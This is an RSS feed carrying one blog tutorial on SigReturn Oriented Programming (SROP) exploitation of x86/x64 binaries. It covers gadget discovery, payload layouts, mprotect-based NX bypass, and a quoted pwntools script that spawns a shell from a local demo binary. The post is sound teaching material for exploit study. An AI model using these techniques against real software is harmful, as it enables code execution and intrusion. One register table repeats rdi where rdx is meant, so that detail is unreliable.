<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Rog3rSm1th</title>
        <link>https://Rog3rSm1th.github.io/posts/</link>
        <description>Recent content in Posts on Rog3rSm1th</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Thu, 10 Jun 2021 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://Rog3rSm1th.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Exploit a binary with SigReturn Oriented Programming (SROP)</title>
            <link>https://Rog3rSm1th.github.io/posts/sigreturn-oriented-programming/</link>
            <pubDate>Thu, 10 Jun 2021 00:00:00 +0000</pubDate>
            
            <guid>https://Rog3rSm1th.github.io/posts/sigreturn-oriented-programming/</guid>
            <description>I wrote this article in order to synthesize the different methods I have encountered to exploit a binary with SROP, it is also a preparatory work for the development of a tool allowing to automatically search in a binary the elements useful to the creation of a SROP exploit.
 Since its first presentation at the 35th Security and Privacy IEEE conference in 2014, the SROP method has been the subject of several papers, as well as numerous CTF challenges, however, it remains difficult to find a comprehensive paper on this topic, so this will be the focus of this article.</description>
            <content type="html"><![CDATA[<blockquote>
<p><em>I wrote this article in order to synthesize the different methods I have encountered to exploit a binary with SROP, it is also a preparatory work for the development of a tool allowing to automatically search in a binary the elements useful to the creation of a SROP exploit.</em></p>
</blockquote>
<p>Since its first presentation at the 35th <em>Security and Privacy IEEE conference</em> in 2014, the <em>SROP</em> method has been the subject of several papers, as well as numerous CTF challenges, however, it remains difficult to find a comprehensive paper on this topic, so this will be the focus of this article.</p>
<p>We will cover (probably not exhaustively) the different ways that can be used to exploit a <code>x64/x86</code> binary using the <em>SROP</em> method.</p>
<ol>
<li><a href="#how-does-it-works">How does it works?</a></li>
<li><a href="#why-using-this-technique">Why using this technique?</a></li>
<li><a href="#the-different-ways-to-set-the-eax-register-to-0xf">The different ways to set the eax register to 0xf</a></li>
<li><a href="#exemples-of-custom-sigcontexts">Exemples of custom sigcontexts</a></li>
</ol>
<h2 id="how-does-it-works">How does it works?</h2>
<p>In order to understand how <em>SROP</em> works, we must first understand what happens when a <em>signal</em> occurs in a Unix-like system.</p>
<p>Signals are not the subject of this article, but you can find what you need to understand the following <a href="https://en.wikipedia.org/wiki/Signal_(IPC)">here</a></p>
<h4 id="what-happens-when-a-signal-occurs">What happens when a signal occurs:</h4>
<ul>
<li>the execution of the process will be paused by the <em>kernel</em> in order to jump to a routine that will handle the signal.</li>
<li>In order to safely resume execution after the handler, the context of this process is pushed to be saved on the <em>stack</em> (registers, flags, instruction pointer, stack pointer&hellip;).
the context takes the form of a &ldquo;sigcontext&rdquo; structure whose details can be found <a href="https://github.com/torvalds/linux/blob/master/arch/x86/include/uapi/asm/sigcontext.h">here</a></li>
</ul>
<p><img src="https://i.imgur.com/I0R0bJx.png#center" alt=""></p>
<ul>
<li><code>sigreturn()</code> is called once the handler is finished. the process context is restored from the stack and the stack values are removed.</li>
</ul>
<p><img src="https://i.imgur.com/LTzct8J.png#center" alt=""></p>
<p>now that we know all this, we can use this system to exploit a binary.</p>
<p>-&gt; We need three things for a good <em>SROP</em>:</p>
<ul>
<li>First, a <em>buffer overflow</em> vulnerability</li>
<li>A way to put the value <code>0xf</code> into the <code>eax</code> register</li>
<li>a <code>syscall; ret</code> gagdet</li>
</ul>
<h2 id="why-using-this-technique">Why using this technique?</h2>
<ul>
<li>This method allows to build an exploit with a very limited number of gagdets (<em>ROP</em>)</li>
<li>It&rsquo;s much easier to control the execution context (<em>registers</em> status) than with a classical <em>ROP</em></li>
<li><em>SROP</em> exploits are usually portable across different binaries with minimal or no effort and allow easily setting the contents of the <em>registers</em></li>
<li>Because we can ðŸ˜‰</li>
</ul>
<h2 id="the-different-ways-to-set-the-eax-register-to-0xf">The different ways to set the <code>eax</code> register to <code>0xf</code></h2>
<h3 id="the-trivial-case-we-have-a-mov-eax-0xf-gagdet">The trivial case: we have a <code>mov eax, 0xf</code> gagdet</h3>
<p>the case where this gadget is present in the binary is the simplest to exploit, since it will allow us to place <code>0xf</code> into the eax register in a single action, no need to chain <em>ROP gadgets</em>.</p>
<p>âž¡ <strong>Exemple</strong> :</p>
<p>We start by searching the different <em>ROP gadgets</em> present in the binary with the <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> tool</p>
<pre><code>    $ ~ ROPgadget --binary trivial
    Gadgets information
    ============================================================
    [...]
    0x0000000000001139 : syscall ; ret
    [...]
    0x0000000000001143 : mov eax, 0xf ; ret
    [...]
</code></pre><p>With these two <em>gadgets</em>, building an exploit becomes very simple</p>
<p>Here is the structure of our exploit.</p>
<table>
<thead>
<tr>
<th><!-- raw HTML omitted --></th>
</tr>
</thead>
<tbody>
<tr>
<td>Padding until we reach the saved <code>rip</code></td>
</tr>
<tr>
<td>address of the  <code>mov eax, 0xf ; ret</code> gadget ( <code>0x0000000000001143</code> )</td>
</tr>
<tr>
<td>address of the  <code>syscall ; ret</code> gadget ( <code>0x0000000000001139</code> )</td>
</tr>
<tr>
<td>SigContext structure with the desired parameters</td>
</tr>
</tbody>
</table>
<h3 id="using-thepop-eax-ret-gadget">Using the<code>pop eax; ret</code> gadget</h3>
<p>This case is a &ldquo;variant&rdquo; of the previous one where it is still rather simple to put the value <code>0xf</code> in the <code>eax</code> register</p>
<p>âž¡ <strong>Exemple</strong> :</p>
<pre><code>    $ ~ ROPgadget --binary pop_eax
    Gadgets information
    ============================================================
    [...]
    0x000000000040101b : syscall ; ret
    [...]
    0x0000000000401020 : pop eax ; ret
    [...]
</code></pre><p>Here is the structure of our exploit.</p>
<table>
<thead>
<tr>
<th><!-- raw HTML omitted --></th>
</tr>
</thead>
<tbody>
<tr>
<td>Padding until we reach the saved <code>rip</code></td>
</tr>
<tr>
<td>address of the  <code>pop eax ; ret</code> gadget ( <code>0x0000000000401020</code> )</td>
</tr>
<tr>
<td><code>0xf</code>Â (<em>sigreturn syscall</em> number)</td>
</tr>
<tr>
<td>address of the  <code>syscall ; ret</code> gadget ( <code>0x000000000040101b</code> )</td>
</tr>
<tr>
<td>SigContext structure with the desired parameters</td>
</tr>
</tbody>
</table>
<p>example of a python exploit by <a href="https://github.com/mishrasunny174">mishrasunny174</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x48</span>
padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>offset
pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401020</span> <span style="color:#75715e">#pop rax, ret gadget</span>
syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040101b</span> <span style="color:#75715e">#syscall gadget</span>
bin_sh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000402000</span> <span style="color:#75715e">#bin_sh location in binary</span>
p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./srop&#39;</span>)
payload <span style="color:#f92672">=</span> padding
payload <span style="color:#f92672">+=</span> p64(pop_rax)
payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">15</span>)
payload <span style="color:#f92672">+=</span> p64(syscall)
frame <span style="color:#f92672">=</span> SigreturnFrame()
frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_execve
frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> bin_sh
frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall
payload <span style="color:#f92672">+=</span> str(frame)
p<span style="color:#f92672">.</span>sendline(payload)
p<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>The author of the exploit uses the presence of the string <code>/bin/sh</code> in the binary by passing it as a parameter to the <code>execve</code> function via the <code>rdi</code> register, but it is obviously possible to use many other methods.</p>
<h3 id="use-the-read-syscall-to-set-the-eax-register-to-0xf">Use the <code>read</code> syscall to set the <code>eax</code> register to <code>0xf</code></h3>
<p>An interesting thing to know is that the <code>read</code> syscall records the number of bytes read into the <code>eax</code> register.</p>
<p>There are two methods to set the value <code>0xf</code> in eax using the <code>read</code> syscall:</p>
<h4 id="using-the-mov-eax-0x0-gadget">Using the <code>mov eax, 0x0</code> gadget</h4>
<table>
<thead>
<tr>
<th><!-- raw HTML omitted --></th>
</tr>
</thead>
<tbody>
<tr>
<td>Padding until we reach the saved <code>rip</code></td>
</tr>
<tr>
<td>address of the <code>mov eax, 0x0; ret</code> gadget</td>
</tr>
<tr>
<td>address of the <code>syscall; ret</code>  gadget</td>
</tr>
</tbody>
</table>
<p>Then we send a <em>15 bytes</em> (<code>0xf</code> -&gt; 15 in decimal) string to the binary, which will allow us to place the value <code>0xf</code> in <code>eax</code></p>
<p>And finally :</p>
<table>
<thead>
<tr>
<th><!-- raw HTML omitted --></th>
</tr>
</thead>
<tbody>
<tr>
<td>address of the <code>syscall; ret</code>  gadget</td>
</tr>
<tr>
<td>SigContext structure with the desired parameters</td>
</tr>
</tbody>
</table>
<h4 id="using-the-pop-eax-gadget">Using the <code>pop eax</code> gadget</h4>
<table>
<thead>
<tr>
<th><!-- raw HTML omitted --></th>
</tr>
</thead>
<tbody>
<tr>
<td>Padding until we reach the saved <code>rip</code></td>
</tr>
<tr>
<td>address of the <code>pop eax; ret</code> gadget</td>
</tr>
<tr>
<td><code>0x0</code> (<code>read</code> syscall number)</td>
</tr>
<tr>
<td>address of the <code>syscall; ret</code> gadget</td>
</tr>
</tbody>
</table>
<p>Then we send a 15 bytes string to the binary, which will allow us to place the value <code>0xf</code> in <code>eax</code></p>
<p>And finally :</p>
<table>
<thead>
<tr>
<th><!-- raw HTML omitted --></th>
</tr>
</thead>
<tbody>
<tr>
<td>address of the <code>syscall; ret</code>  gadget</td>
</tr>
<tr>
<td>SigContext structure with the desired parameters</td>
</tr>
</tbody>
</table>
<h2 id="exemples-of-custom-sigcontexts">Exemples of custom sigcontexts</h2>
<p>Once you have figured out how to call the <code>sigreturn</code> syscall, you need to figure out how to get a <strong>shell</strong> through the context that will be restored from the stack.</p>
<h4 id="if-the-binary-contains-the-binsh-string">If the binary contains the <code>/bin/sh</code> string</h4>
<p>The idea is to call the <code>execve</code> function ( syscall <code>0x3b</code> -&gt; 59 in decimal ) with the string <code>/bin/sh</code> as parameter which will give us a shell. The string <code>/bin/sh</code> can either be present in the binary or you can write it in a memory area whose you know the address.</p>
<table>
<thead>
<tr>
<th>Register</th>
<th>value</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>rip</code></td>
<td><code>syscall</code> instruction address</td>
</tr>
<tr>
<td><code>rax</code></td>
<td><code>0x3b</code> (<code>execve</code> syscall)</td>
</tr>
<tr>
<td><code>rdi</code></td>
<td>address of <code>/bin/sh</code></td>
</tr>
<tr>
<td><code>rsi</code></td>
<td><code>0x0</code> (NULL)</td>
</tr>
<tr>
<td><code>rdi</code></td>
<td><code>0x0</code> (NULL)</td>
</tr>
</tbody>
</table>
<h4 id="use-mprotect">Use <code>mprotect</code></h4>
<blockquote>
<p><strong>mprotect</strong> : set protection on a region of memory</p>
</blockquote>
<p>We use <code>mprotect</code> to make a memory area of our choice executable and writable to allow <em>shellcode</em> execution at that address. Then we shift the stack to that area so we can easily write data to it. We put in <code>rsp</code> the address containing the entry point of the program to ensure a normal <em>controlflow</em>. We can then arrange to redirect the program to the <em>shellcode</em> address, which will be executed despite the <em>NX protection</em>.</p>
<table>
<thead>
<tr>
<th>Register</th>
<th>value</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>rax</code></td>
<td><code>0xa</code> (<code>mprotect</code> syscall)</td>
</tr>
<tr>
<td><code>rdi</code></td>
<td>shellcode address</td>
</tr>
<tr>
<td><code>rsi</code></td>
<td>size (<code>0x1000</code> for exemple)</td>
</tr>
<tr>
<td><code>rdx</code></td>
<td><code>0x7</code> -&gt; mode (rwx)</td>
</tr>
<tr>
<td><code>rsp</code></td>
<td>entrypoint (new stack)</td>
</tr>
<tr>
<td><code>rip</code></td>
<td>address of the <code>syscall; ret</code> gadget</td>
</tr>
</tbody>
</table>
<h2 id="to-go-further">To go further</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Sigreturn-oriented_programming">Wikipedia article about SROP</a></li>
<li><a href="https://hackmd.io/@imth/SROP">A write-Up for the Minipwn challenge from the 2019 TheManyHatsClub CTF</a></li>
<li><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=6956568">Article from Erik Bosman</a></li>
</ul>
<h3 id="thanks-for-reading">Thanks for reading!</h3>
<p>for more informations or suggestions, you can contact me at : <a href="mailto:r0g3r5@protonmail.com">r0g3r5@protonmail.com</a>, or on twitter at <a href="https://twitter.com/Rog3rSm1th">@Rog3rSm1th</a></p>
]]></content>
        </item>
        
    </channel>
</rss>
